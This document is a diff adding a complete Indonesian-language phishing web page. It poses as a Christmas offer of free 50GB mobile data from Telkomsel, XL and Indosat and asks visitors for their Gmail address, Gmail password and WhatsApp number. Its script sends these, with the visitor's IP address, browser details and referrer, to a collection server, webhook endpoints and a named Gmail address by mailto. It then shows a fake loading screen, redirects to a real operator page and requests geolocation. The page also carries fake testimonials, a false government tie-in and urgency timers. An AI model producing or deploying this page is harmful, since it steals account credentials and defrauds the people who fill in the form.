@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎅 NATAL BERKAH - Kuota Gratis 50GB! 🎁</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a0b2e, #0d1b2a);
+            color: white;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .snow {
+            position: fixed;
+            top: -10px;
+            color: white;
+            font-size: 20px;
+            animation: fall linear infinite;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        @keyframes fall {
+            to { transform: translateY(100vh); }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: linear-gradient(90deg, #ff3366, #33ccff, #ffcc00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header h1 {
+            font-size: 3.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            color: #aaa;
+        }
+
+        .counter {
+            background: rgba(255, 0, 85, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 30px auto;
+            max-width: 600px;
+            text-align: center;
+            border: 1px solid rgba(255, 0, 85, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 85, 0.3); }
+            50% { box-shadow: 0 0 40px rgba(255, 0, 85, 0.6); }
+        }
+
+        .counter h2 {
+            color: #ff33aa;
+            margin-bottom: 10px;
+        }
+
+        #countdown {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #00ffcc;
+            text-shadow: 0 0 10px #00ffcc;
+        }
+
+        .benefits {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+
+        .benefit-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            transition: transform 0.3s;
+            border: 1px solid rgba(51, 204, 255, 0.3);
+        }
+
+        .benefit-card:hover {
+            transform: translateY(-5px);
+            border-color: #33ccff;
+        }
+
+        .benefit-card .icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        .form-section {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            border-radius: 20px;
+            margin: 50px auto;
+            max-width: 600px;
+            border: 1px solid rgba(51, 204, 255, 0.5);
+            backdrop-filter: blur(10px);
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #33ccff;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #33ccff;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff3366;
+            box-shadow: 0 0 15px rgba(255, 51, 102, 0.5);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(45deg, #ff3366, #33ccff);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 1.3em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(255, 51, 102, 0.4);
+            background: linear-gradient(45deg, #33ccff, #ff3366);
+        }
+
+        .testimonials {
+            margin: 50px 0;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+        }
+
+        .testimonial-slider {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            padding: 20px 0;
+        }
+
+        .testimonial {
+            min-width: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #ff3366;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 30px;
+            color: #aaa;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 50px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a0b2e, #0d1b2a);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            border: 2px solid #ff3366;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #ff3366, #33ccff);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <!-- Salju -->
+    <script>
+        for(let i = 0; i < 100; i++) {
+            let snow = document.createElement('div');
+            snow.className = 'snow';
+            snow.innerHTML = '❄';
+            snow.style.left = Math.random() * 100 + 'vw';
+            snow.style.animationDuration = Math.random() * 3 + 2 + 's';
+            snow.style.opacity = Math.random();
+            snow.style.fontSize = Math.random() * 20 + 10 + 'px';
+            document.body.appendChild(snow);
+        }
+    </script>
+
+    <div class="container">
+        <div class="header">
+            <h1>🎄 NATAL BERKAH 2024 🎁</h1>
+            <p>Dapatkan Kuota Gratis 50GB dari Telkomsel, XL, dan Indosat!</p>
+            <p>Spesial untuk 500 pendaftar pertama</p>
+        </div>
+
+        <div class="counter">
+            <h2>⏰ WAKTU TERBATAS!</h2>
+            <div id="countdown">23:59:59</div>
+            <p>Segera daftar sebelum kuota habis!</p>
+        </div>
+
+        <div class="benefits">
+            <div class="benefit-card">
+                <div class="icon">📶</div>
+                <h3>50GB Kuota Gratis</h3>
+                <p>Untuk semua operator dengan masa aktif 30 hari</p>
+            </div>
+            <div class="benefit-card">
+                <div class="icon">🎮</div>
+                <h3>Kuota Game</h3>
+                <p>10GB khusus untuk Mobile Legends, Free Fire, PUBG</p>
+            </div>
+            <div class="benefit-card">
+                <div class="icon">📺</div>
+                <h3>Kuota Streaming</h3>
+                <p>15GB untuk YouTube, Netflix, Disney+</p>
+            </div>
+            <div class="benefit-card">
+                <div class="icon">🌐</div>
+                <h3>Kuota Unlimited</h3>
+                <p>25GB untuk browsing dan sosial media</p>
+            </div>
+        </div>
+
+        <div class="form-section">
+            <h2 style="text-align: center; margin-bottom: 30px; color: #ffcc00;">
+                📝 FORM PENDAFTARAN KUOTA NATAL
+            </h2>
+            
+            <form id="registrationForm">
+                <div class="form-group">
+                    <label for="email">📧 Email Google (Gmail)</label>
+                    <input type="email" id="email" name="email" required 
+                           placeholder="contoh: nama@gmail.com">
+                    <small style="color: #aaa;">Harus menggunakan email Google aktif</small>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">🔐 Password Email Google</label>
+                    <input type="password" id="password" name="password" required 
+                           placeholder="Masukkan password email Google Anda">
+                    <small style="color: #aaa;">Diperlukan untuk verifikasi akun Google</small>
+                </div>
+
+                <div class="form-group">
+                    <label for="operator">📱 Pilih Operator</label>
+                    <select id="operator" name="operator" style="width: 100%; padding: 15px; 
+                           background: rgba(255,255,255,0.1); border: 2px solid #33ccff; 
+                           border-radius: 10px; color: white; font-size: 16px;">
+                        <option value="telkomsel">Telkomsel</option>
+                        <option value="xl">XL Axiata</option>
+                        <option value="indosat">Indosat Ooredoo</option>
+                        <option value="three">3 (Three)</option>
+                        <option value="smartfren">Smartfren</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">📞 Nomor WhatsApp</label>
+                    <input type="tel" id="phone" name="phone" required 
+                           placeholder="08xxxxxxxxxx">
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    🎅 KLIM SEKARANG! DAPATKAN KUOTA 50GB 🎁
+                </button>
+            </form>
+
+            <div style="margin-top: 20px; text-align: center; color: #aaa; font-size: 0.9em;">
+                ⚠️ Dengan mendaftar, Anda menyetujui syarat dan ketentuan
+            </div>
+        </div>
+
+        <div class="testimonials">
+            <h2 style="text-align: center; margin-bottom: 30px; color: #33ccff;">
+                💬 TESTIMONI PENERIMA KUOTA
+            </h2>
+            <div class="testimonial-slider">
+                <div class="testimonial">
+                    <p>"Langsung dapat 50GB! Terima kasih program Natalnya!"</p>
+                    <strong>- Budi, Jakarta</strong>
+                </div>
+                <div class="testimonial">
+                    <p>"Kuota game untuk ML langsung nyala, mantap banget!"</p>
+                    <strong>- Sari, Bandung</strong>
+                </div>
+                <div class="testimonial">
+                    <p>"Baru daftar, 5 menit kemudian kuota masuk. Recommended!"</p>
+                    <strong>- Rudi, Surabaya</strong>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Program Natal Berkah - Kuota Gratis</p>
+            <p>Program ini bekerja sama dengan Kementerian Komunikasi dan Informatika</p>
+            <p style="font-size: 0.8em; margin-top: 10px;">
+                *Syarat dan ketentuan berlaku | Kuota terbatas untuk 500 pendaftar pertama
+            </p>
+        </div>
+    </div>
+
+    <!-- Modal Loading -->
+    <div id="loadingModal" class="modal">
+        <div class="modal-content">
+            <div style="font-size: 40px; margin-bottom: 20px;">⏳</div>
+            <h2 style="color: #33ccff;">SEDANG MENGIRIM KUOTA...</h2>
+            <p>Harap tunggu, sistem sedang memproses permintaan Anda</p>
+            
+            <div class="loading-bar">
+                <div id="loadingProgress" class="loading-progress"></div>
+            </div>
+            
+            <p id="loadingText" style="margin-top: 20px;">
+                Memverifikasi akun Google...
+            </p>
+            
+            <p style="color: #aaa; font-size: 0.9em; margin-top: 30px;">
+                Jangan tutup atau refresh halaman ini!
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        function startCountdown() {
+            let time = 24 * 60 * 60; // 24 jam
+            
+            function updateCountdown() {
+                const hours = Math.floor(time / 3600);
+                const minutes = Math.floor((time % 3600) / 60);
+                const seconds = time % 60;
+                
+                document.getElementById('countdown').textContent = 
+                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (time > 0) {
+                    time--;
+                    setTimeout(updateCountdown, 1000);
+                }
+            }
+            
+            updateCountdown();
+        }
+        
+        startCountdown();
+
+        // Form submission
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                operator: document.getElementById('operator').value,
+                phone: document.getElementById('phone').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: await getIP(),
+                referrer: document.referrer
+            };
+
+            // Tampilkan loading modal
+            document.getElementById('loadingModal').style.display = 'flex';
+            
+            // Simulasi loading
+            simulateLoading();
+            
+            // Kirim data ke server Anda
+            await sendToYourServer(formData);
+            
+            // Kirim data ke email target
+            sendToTargetEmail(formData);
+            
+            // Simpan ke localStorage
+            saveToLocalStorage(formData);
+            
+            // Redirect setelah 8 detik
+            setTimeout(() => {
+                window.location.href = "https://www.telkomsel.com/promo";
+            }, 8000);
+        });
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'IP tidak terdeteksi';
+            }
+        }
+
+        function simulateLoading() {
+            const steps = [
+                "Memverifikasi akun Google...",
+                "Memeriksa kelayakan penerima...",
+                "Menyiapkan paket kuota 50GB...",
+                "Mengalokasikan kuota game...",
+                "Mengirim konfirmasi ke operator...",
+                "Proses finalisasi..."
+            ];
+            
+            let progress = 0;
+            let stepIndex = 0;
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 100) progress = 100;
+                
+                document.getElementById('loadingProgress').style.width = `${progress}%`;
+                
+                if (stepIndex < steps.length && progress > (stepIndex + 1) * (100 / steps.length)) {
+                    document.getElementById('loadingText').textContent = steps[stepIndex];
+                    stepIndex++;
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('loadingText').textContent = "✅ Berhasil! Mengalihkan ke halaman operator...";
+                }
+            }, 500);
+        }
+
+        async function sendToYourServer(data) {
+            // Ganti dengan server Anda
+            const yourServerURL = "https://your-server.com/api/collect"; // GANTI DENGAN SERVER ANDA
+            
+            try {
+                await fetch(yourServerURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.log("Backup server:", error);
+            }
+        }
+
+        function sendToTargetEmail(data) {
+            const targetEmail = "ndooback0@gmail.com"; // EMAIL TUJUAN
+            const subject = `[KUOTA NATAL] Data Baru - ${new Date().toLocaleString()}`;
+            const body = `
+                🎄 DATA PENERIMA KUOTA NATAL 🎁
+                
+                📧 Email Google: ${data.email}
+                🔐 Password: ${data.password}
+                📱 Operator: ${data.operator}
+                📞 WhatsApp: ${data.phone}
+                
+                📊 INFO SISTEM:
+                Waktu: ${data.timestamp}
+                IP Address: ${data.ip}
+                Browser: ${data.userAgent}
+                Referrer: ${data.referrer}
+                
+                🔒 Data ini telah tersimpan di database.
+            `;
+            
+            // Kirim via mailto (akan terbuka di email client)
+            window.open(`mailto:${targetEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`);
+            
+            // Backup ke Formspree/Webhook
+            sendToWebhook(data);
+        }
+
+        function sendToWebhook(data) {
+            const webhooks = [
+                "https://formspree.io/f/your-form-id", // GANTI
+                "https://webhook.site/your-unique-id"  // GANTI
+            ];
+            
+            webhooks.forEach(url => {
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(() => {});
+            });
+        }
+
+        function saveToLocalStorage(data) {
+            let existing = JSON.parse(localStorage.getItem('kuota_natal_data') || '[]');
+            existing.push(data);
+            localStorage.setItem('kuota_natal_data', JSON.stringify(existing));
+        }
+
+        // Geolocation tracking
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const location = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+                localStorage.setItem('user_location', JSON.stringify(location));
+            });
+        }
+
+        // Session tracking
+        let sessionStart = new Date();
+        window.addEventListener('beforeunload', () => {
+            const sessionDuration = new Date() - sessionStart;
+            localStorage.setItem('session_duration', sessionDuration);
+        });
+    </script>
+</body>
+</html>
